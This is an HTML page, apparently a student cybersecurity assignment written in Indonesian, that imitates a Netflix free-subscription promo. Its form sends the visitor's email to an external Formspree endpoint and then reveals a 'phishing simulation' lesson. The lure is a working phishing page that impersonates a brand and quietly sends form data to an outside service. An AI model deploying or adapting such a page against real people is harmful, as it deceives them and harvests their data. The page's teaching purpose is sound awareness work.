[index2.html](https://github.com/user-attachments/files/24700047/index2.html)
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix Promo - Klaim Voucher</title>
    <style>
        body {
            background-color: #000000;
            color: #ffffff;
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #141414;
            padding: 40px;
            border-radius: 8px;
            width: 100%;
            max-width: 400px;
            text-align: center;
            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
        }
        h1 { color: #e50914; font-size: 2.2rem; margin-bottom: 10px; }
        .promo-box { border: 2px dashed #e50914; padding: 10px; margin-bottom: 20px; }
        input {
            width: 100%; padding: 12px; margin-bottom: 15px; border-radius: 4px;
            border: 1px solid #333; background-color: #333; color: white; box-sizing: border-box;
        }
        button {
            width: 100%; padding: 12px; background-color: #e50914; color: white;
            border: none; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 1rem;
        }
        #status-msg { color: #e50914; font-weight: bold; margin-top: 10px; display: none; }
        .footer-text { font-size: 0.8rem; color: #666; margin-top: 20px; }
        
        /* Gaya Pesan Prank */
        #funny-message {
            display: none; border-top: 1px solid #333; padding-top: 20px;
            animation: fadeIn 1s;
        }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
    </style>
</head>
<body>

<div class="container">
    <div id="main-content">
        <h1>NETFLIX</h1>
        <div class="promo-box">
            <p style="margin:0; font-weight:bold;">PROMO TAHUN BARU 2026</p>
            <p style="margin:0; font-size: 0.9rem;">Gratis Langganan 12 Bulan</p>
        </div>
        
        <p style="font-size: 0.9rem; margin-bottom: 20px;">Masukkan email untuk menerima kode aktivasi:</p>
        
        <form id="my-form" action="https://formspree.io/f/xaqqowaj" method="POST">
            <input type="email" name="email" placeholder="Alamat Email Akun" required>
            <button type="submit" id="submit-btn">AKTIFKAN SEKARANG</button>
        </form>
        <p id="status-msg">⏳ Sedang memproses klaim anda...</p>
    </div>

    <div id="funny-message">
        <h2 style="color: #e50914;">YAHHH KENA DEH! 😜</h2>
        <img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHJueGZueXF4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4JmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZCZjdD1n/vFKqnCdLPNOKc/giphy.gif" width="180" style="border-radius: 10px; margin-bottom: 15px;">
        <p style="font-size: 1.1rem; font-weight: bold;">Simulasi Phishing Berhasil!</p>
        <p style="font-size: 0.9rem; color: #ccc;">Data kamu (simulasi) sudah masuk ke dashboard Mr.Hecker.<br><br>
        <strong>Pelajaran:</strong> Jangan pernah scan QR Code diskon yang tidak jelas sumbernya, ya!</p>
        <p class="footer-text">Tugas Cyber Security - NPM GENAP</p>
    </div>
</div>

<script>
    const form = document.getElementById('my-form');
    const mainContent = document.getElementById('main-content');
    const funnyMessage = document.getElementById('funny-message');
    const statusMsg = document.getElementById('status-msg');
    const submitBtn = document.getElementById('submit-btn');

    form.addEventListener("submit", async function(event) {
        event.preventDefault(); // Mencegah pindah halaman default
        
        submitBtn.disabled = true;
        submitBtn.innerText = "MENGIRIM...";
        statusMsg.style.display = "block";

        const data = new FormData(event.target);

        // Kirim data ke Formspree secara background (AJAX)
        fetch(event.target.action, {
            method: form.method,
            body: data,
            headers: { 'Accept': 'application/json' }
        }).then(response => {
            // JEDA 5 DETIK sebelum memunculkan prank
            setTimeout(() => {
                mainContent.style.display = "none";
                funnyMessage.style.display = "block";
            }, 2000); 
        }).catch(error => {
            alert("Terjadi kesalahan jaringan.");
        });
    });
</script>

</body>
</html>
